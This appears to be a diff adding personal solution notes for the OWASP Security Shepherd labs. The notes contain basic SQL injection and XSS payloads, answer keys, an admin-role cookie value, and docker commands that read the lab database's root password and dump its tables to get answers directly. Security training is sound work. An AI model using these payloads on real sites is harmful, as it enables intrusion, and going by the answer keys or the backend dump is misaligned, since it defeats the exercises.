@@ -1,0 +1,99 @@
+https://github.com/sahinyes/owasp-shepherd-writeups
+
+
+https://purpleskypeter.blogspot.com/2018/03/owasp-securityshepherd-my-practice.html
+
+
+SQL Injection Lesson : 3c17f6bf34080979e0cebda5672e989c07ceec9fa4ee7b7c17c9e3ce26bc63e0
+
+SQL 1: " or ""="
+SELECT * FROM customers WHERE customerId='1' OR "1"="1";
+" OR "1+1
+WHERE ""=""
+
+Mobile Insecure Dataa : mobile/InsecureData/app/src/main/java/com/mobshep/insecuredata/Insecure_Data_Storage.java
+
+https://pts-lab-help.vercel.app/
+
+https://purpleskypeter.blogspot.com/2018/03/owasp-securityshepherd-my-practice.html
+
+https://github.com/romangrewal/owasp-juice-shop-solutions
+
+https://docs.google.com/document/d/1S-2bAesXlQ7qnD1VuCfLmJxhnUjL3exL/edit?usp=sharing&ouid=105151147548969187915&rtpof=true&sd=true
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+some more Extras...
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+1. 
+7708FE7311FECC85CF92E118392555F58B655ACAE9D844B114A718B58A1932B87BEE9A3BBF0EC63CC5335E59A0393675245F9A6038810D2AB4896AE82524A8BB
+
+2. 
+<SCRIPT>alert('XSS')</SCRIPT>
+5E77AE5A0EEA3A137E6A239322C84662C2C72AE6B5379A8E1081601E23E8C45EB4A4F865CFA66DCB122F888544C86E64921BF6509588B3209FEF9A3FB01D259D
+
+3.
+<IMG SRC="#" ONERROR="alert('XSS')"/>
+122E7EE0BAD50AE19DEABE1D36650E8185C27861A5800E10BCA5CA53CFC656AEDE43C705F8F54DEE6CBE32750DAC19DC015A395ADACE4A098B2990D225A9A6EC
+
+4.
+https://github.com/OWASP/SecurityShepherd/releases/tag/v3.1
+Battery777
+
+docker exec -it sclab-s2-mysql mysql -u root --password=CowSaysMoo -e "
+SELECT table_schema, table_name
+FROM information_schema.tables
+WHERE table_schema NOT IN ('mysql','information_schema','performance_schema','sys');"
+
+docker exec -it sclab-s2-mysql mysql -u root --password=CowSaysMoo -e "SHOW DATABASES;"
+
+5.
+docker exec -it sclab-s2-mysql mysql -u root --password=CowSaysMoo -e "SELECT * FROM tb_users;" SqlInjLesson
+3c17f6bf34080979e0cebda5672e989c07ceec9fa4ee7b7c17c9e3ce26bc63e0
+
+6. 
+docker exec -it sclab-s2-mysql mysql -u root --password=CowSaysMoo -e "SELECT * FROM customers;" SqlChalOne
+fd8e9a29dab791197115b58061b215594211e72c1680f1eacc50b0394133a09f
+
+7. 
+DrumaDrumaDrumBoomBoom
+
+dXNlclJvbGU9YWRtaW5pc3RyYXRvcg
+https://github.com/OWASP/SecurityShepherd/releases/tag/v3.1
+
+SilentButSteadyRedLed
+
+spcil/|Pse3cr3etCouponStu.f4rU176
+
+description mee daal payload(profile mee)
+normal script wala
+
+
+2. SQL INJECTION:- " OR 1=1 --(space)
+
+
+3. Cross site scripting:-
+
+<img src= x onerror = alert(1)>
+
+
+
+
+
+1. password
+
+docker inspect sclab-s2-mysql | grep -i password
+
+2. database
+
+docker exec -it sclab-s2-mysql mysql -u root --password=CowSaysMoo -e "
+SELECT table_schema, table_name
+FROM information_schema.tables
+WHERE table_schema NOT IN ('mysql','information_schema','performance_schema','sys');"
+
+
+3. fetch data
+
+docker exec -it sclab-s2-mysql mysql -u root --password=CowSaysMoo -e "SELECT * FROM tb_users;" SqlInjLesson
